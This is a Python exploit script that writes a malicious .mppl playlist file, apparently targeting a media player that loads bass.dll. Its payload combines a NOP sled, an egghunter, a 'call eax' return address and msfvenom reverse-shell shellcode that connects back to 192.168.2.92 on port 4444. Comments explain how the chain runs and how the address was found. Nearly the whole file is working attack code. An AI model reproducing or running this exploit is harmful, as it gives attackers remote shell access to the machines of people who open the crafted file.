import os
import struct 

class Exploit:
    payload_file = os.getcwd() + "\\exp.mppl"
    badchar_file = os.getcwd() + "\\badchar.bin"

    @classmethod
    def generate_badchar(cls):
        badchar_str = b""
        badchar_list = [0x00, 0x0a, 0xd]

        for i in range(0x00, 0xff + 1):
            if i not in badchar_list:
                badchar_str += struct.pack("B", i)

        with open(cls.badchar_file, "wb+") as bf:
            bf.write(badchar_str)

        return badchar_str
    
    @classmethod
    def conv_addr(cls, addr):
        return struct.pack("<I", addr)

    @classmethod
    def create_payload(cls):     
        # !mona find -type instr -s "call eax" -x X
        #
        # 0x1001dddf : "call eax" |  {PAGE_EXECUTE_READWRITE} [bass.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.2 (C:\Users\adminuser\Desktop\microp\microp\bass.dll)
        eip = cls.conv_addr(0x1001dddf)
        
        # To offset = 1276
        nop_sled = b"\x90" * 1244

        egghunter =  b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
        egghunter += b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
        egghunter += b"\x57\x30\x30\x54" # W00T
        egghunter += b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

        egg = b"\x57\x30\x30\x54\x57\x30\x30\x54" # WOOTWOOT

        # root@kali:/tmp# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.92 LPORT=4444 -f python -b "\x00\x0a\x0d"
        # Payload size: 351 bytes
        shellcode =  b""
        shellcode += b"\xdb\xc2\xba\xa5\x26\x0e\xbb\xd9\x74\x24\xf4\x58\x2b"
        shellcode += b"\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\x65\x22\xec"
        shellcode += b"\x4e\x99\xc3\x72\xb0\x61\x14\x13\x38\x84\x25\x13\x5e"
        shellcode += b"\xcd\x16\xa3\x14\x83\x9a\x48\x78\x37\x28\x3c\x55\x38"
        shellcode += b"\x99\x8b\x83\x77\x1a\xa7\xf0\x16\x98\xba\x24\xf8\xa1"
        shellcode += b"\x74\x39\xf9\xe6\x69\xb0\xab\xbf\xe6\x67\x5b\xcb\xb3"
        shellcode += b"\xbb\xd0\x87\x52\xbc\x05\x5f\x54\xed\x98\xeb\x0f\x2d"
        shellcode += b"\x1b\x3f\x24\x64\x03\x5c\x01\x3e\xb8\x96\xfd\xc1\x68"
        shellcode += b"\xe7\xfe\x6e\x55\xc7\x0c\x6e\x92\xe0\xee\x05\xea\x12"
        shellcode += b"\x92\x1d\x29\x68\x48\xab\xa9\xca\x1b\x0b\x15\xea\xc8"
        shellcode += b"\xca\xde\xe0\xa5\x99\xb8\xe4\x38\x4d\xb3\x11\xb0\x70"
        shellcode += b"\x13\x90\x82\x56\xb7\xf8\x51\xf6\xee\xa4\x34\x07\xf0"
        shellcode += b"\x06\xe8\xad\x7b\xaa\xfd\xdf\x26\xa3\x32\xd2\xd8\x33"
        shellcode += b"\x5d\x65\xab\x01\xc2\xdd\x23\x2a\x8b\xfb\xb4\x4d\xa6"
        shellcode += b"\xbc\x2a\xb0\x49\xbd\x63\x77\x1d\xed\x1b\x5e\x1e\x66"
        shellcode += b"\xdb\x5f\xcb\x29\x8b\xcf\xa4\x89\x7b\xb0\x14\x62\x91"
        shellcode += b"\x3f\x4a\x92\x9a\x95\xe3\x39\x61\x7e\xcc\x16\x6b\x22"
        shellcode += b"\xa4\x64\x6b\xcb\x68\xe0\x8d\x81\x80\xa4\x06\x3e\x38"
        shellcode += b"\xed\xdc\xdf\xc5\x3b\x99\xe0\x4e\xc8\x5e\xae\xa6\xa5"
        shellcode += b"\x4c\x47\x47\xf0\x2e\xce\x58\x2e\x46\x8c\xcb\xb5\x96"
        shellcode += b"\xdb\xf7\x61\xc1\x8c\xc6\x7b\x87\x20\x70\xd2\xb5\xb8"
        shellcode += b"\xe4\x1d\x7d\x67\xd5\xa0\x7c\xea\x61\x87\x6e\x32\x69"
        shellcode += b"\x83\xda\xea\x3c\x5d\xb4\x4c\x97\x2f\x6e\x07\x44\xe6"
        shellcode += b"\xe6\xde\xa6\x39\x70\xdf\xe2\xcf\x9c\x6e\x5b\x96\xa3"
        shellcode += b"\x5f\x0b\x1e\xdc\xbd\xab\xe1\x37\x06\xdb\xab\x15\x2f"
        shellcode += b"\x74\x72\xcc\x6d\x19\x85\x3b\xb1\x24\x06\xc9\x4a\xd3"
        shellcode += b"\x16\xb8\x4f\x9f\x90\x51\x22\xb0\x74\x55\x91\xb1\x5c"

        # Exploit execution:
        # CALL EAX -> NOP SLED -> EGG HUNTER -> EGG -> EXECUTE SHELLCODE
        #
        # Usual jump esp doesn't work because EAX will hold values to the beginning of buffer.
        payload =  nop_sled
        payload += egghunter
        payload += eip
        payload += b"\x90" * 32
        payload += egg
        payload += shellcode 

        try:
            with open(cls.payload_file, 'wb+') as pf:
                pf.write(payload)

            print(f"[+] Payload written.")
        
        except:
            print(f"[!] Error writing to file.")

if __name__ == "__main__":
    Exploit.create_payload()

        